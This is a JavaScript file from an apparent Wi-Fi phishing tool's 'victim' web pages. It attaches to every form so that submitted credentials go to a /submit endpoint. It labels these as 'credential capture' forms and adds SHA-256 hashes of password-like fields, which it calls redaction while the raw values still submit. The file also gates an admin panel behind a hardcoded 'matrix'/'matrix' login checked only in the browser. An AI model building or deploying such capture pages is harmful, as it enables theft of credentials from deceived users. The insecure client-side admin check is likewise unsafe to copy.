// wifitool/web/victim/script.js

(function () {
  'use strict';

  function el(id) { 
    return document.getElementById(id); 
  }

  const SENSITIVE_KEYWORDS = ["password", "pass", "pwd", "pin", "secret", "credential", "passwd"];

  // --- HELPER FUNCTIONS (for capture) ---

  function isSensitive(name) {
    if (!name) return false;
    const n = name.toLowerCase();
    return SENSITIVE_KEYWORDS.some(k => n.includes(k));
  }

  function bufToHex(buffer) {
    return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2, '0')).join('');
  }

  async function sha256Hex(text) {
    const enc = new TextEncoder();
    const data = enc.encode(text || '');
    const hashBuf = await crypto.subtle.digest('SHA-256', data);
    return bufToHex(hashBuf);
  }

  function removeExistingHashes(form) {
    const prev = form.querySelectorAll("input[name^='_hash_']");
    prev.forEach(n => n.remove());
  }

  // --- HANDLER 1: ADMIN LOGIN (for id="access-form") ---

  /**
   * Handles the form submission for the main admin login page.
   * This function PREVENTS submission to /submit.
   */
  async function handleAdminLogin(evt) {
    // Stop the form from submitting to /submit
    evt.preventDefault();
    
    const form = evt.target;
    // Note: We use the IDs from index.html
    const userEl = el('device_name'); 
    const passEl = el('password');
    const leadText = form.parentElement.querySelector('.lead');

    // Make sure all elements exist before proceeding
    if (!userEl || !passEl || !leadText) {
      console.error("Admin form is missing required elements (device_name, password, or .lead)");
      return;
    }

    const username = userEl.value;
    const password = passEl.value;

    // Check the credentials
    if (username === 'matrix' && password === 'matrix') {
      // SUCCESS
      leadText.textContent = 'Login successful, redirecting...';
      leadText.classList.remove('form-error-message');
      form.classList.remove('form-error');
      
      // Redirect to the admin panel
      window.location.href = '/admin';

    } else {
      // FAILURE
      leadText.textContent = 'Incorrect username or password.';
      leadText.classList.add('form-error-message');
      form.classList.add('form-error');
    }
  }

  // --- HANDLER 2: CREDENTIAL CAPTURE (for all other forms) ---

  /**
   * Handles form submission for all OTHER forms.
   * This function ALLOWS submission to /submit.
   */
  async function handleCaptureSubmit(evt) {
    // This is the original credential capture logic.
    // It does NOT check for 'matrix' and lets the form submit.
    const form = evt.target;
    try {
      const elements = Array.from(form.elements).filter(el => el && el.name && !el.disabled);
      const hashPairs = [];

      for (const el of elements) {
        const name = el.name;
        if (isSensitive(name)) {
          const raw = el.value || '';
          try {
            const h = await sha256Hex(raw);
            hashPairs.push({ name, hash: h });
          } catch (e) {
            console.error("Hash error:", e);
          }
        }
      }

      removeExistingHashes(form);
      for (const p of hashPairs) {
        const hidden = document.createElement("input");
        hidden.type = "hidden";
        hidden.name = `_hash_${p.name}`;
        hidden.value = p.hash;
        form.appendChild(hidden);
      }
      
      // Allow form to submit to /submit
      return true;

    } catch (err) {
      console.error("Error in redaction script:", err);
    }
  }

  // --- ATTACH HANDLERS ---

  /**
   * Finds all forms and attaches the correct handler based on the form's ID.
   */
  function attachToForms() {
    const forms = document.querySelectorAll("form");
    for (const f of forms) {
      // Skip if we've already attached a handler
      if (f.dataset.__handler_attached) continue;

      if (f.id === 'access-form') {
        // This is the Admin Login form (from index.html)
        f.addEventListener("submit", handleAdminLogin);
      } else {
        // This is a credential capture form (e.g., from link1.html)
        f.addEventListener("submit", handleCaptureSubmit);
      }
      f.dataset.__handler_attached = "1";
    }
  }

  // Observe DOM mutations to attach to forms added later
  function watchForForms() {
    const observer = new MutationObserver(() => attachToForms());
    observer.observe(document.documentElement || document.body, { childList: true, subtree: true });
  }

  // --- INITIALIZATION ---

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", () => {
      attachToForms();
      watchForForms();
    });
  } else {
    attachToForms();
    watchForForms();
  }

})();